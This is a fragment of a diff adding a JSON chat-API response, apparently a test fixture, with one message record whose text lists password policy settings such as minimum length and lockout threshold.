+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "CRDL6JWLrmFPWofaA",
+      "rid": "8wP8rwyszCpfubDuH",
+      "msg": "```\nMinimum password length: 8\nLength of password history maintained: 3\nLockout threshold: 15\nLockout duration (minutes): 15\n```",
+      "ts": "2020-09-22T10:46:29.798Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-09-22T12:04:16.571Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-09-22T12:04:16.565Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    }
+  ],
+  "success": true
+}
